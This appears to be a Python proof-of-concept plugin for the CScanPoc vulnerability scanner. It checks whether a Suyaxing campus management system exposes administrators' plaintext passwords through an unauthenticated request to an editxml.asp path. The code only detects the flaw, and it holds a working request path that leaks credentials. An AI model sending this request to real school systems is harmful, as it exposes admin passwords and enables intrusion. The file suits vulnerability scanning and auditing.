# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '4f7b797a-d04c-4021-9362-f92bbf053b69'
    name = '苏亚星校园管理系统 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-01-08'  # 漏洞公布时间
    desc = '''
        南京苏亚星校园管理系统设计缺陷导致获取任意管理员明文密码（无需登录）。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '苏亚星校园管理系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版

class Poc(ABPoc):
    poc_id = '4c35be40-cfbd-4b5d-945e-1612acb52890'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer http://www.wooyun.org/bugs/wooyun-2010-090403
            payload = '/ws2004/SysManage/UserManage/SysManage/editxml.asp?ID=1'
            #code, head, res, errcode, _ = curl.curl2(arg+payload)
            r = requests.get(self.target + payload)

            if r.status_code == 200 and '<PassWords>' in r.content:
                #security_hole('Find admin passwd in '+arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
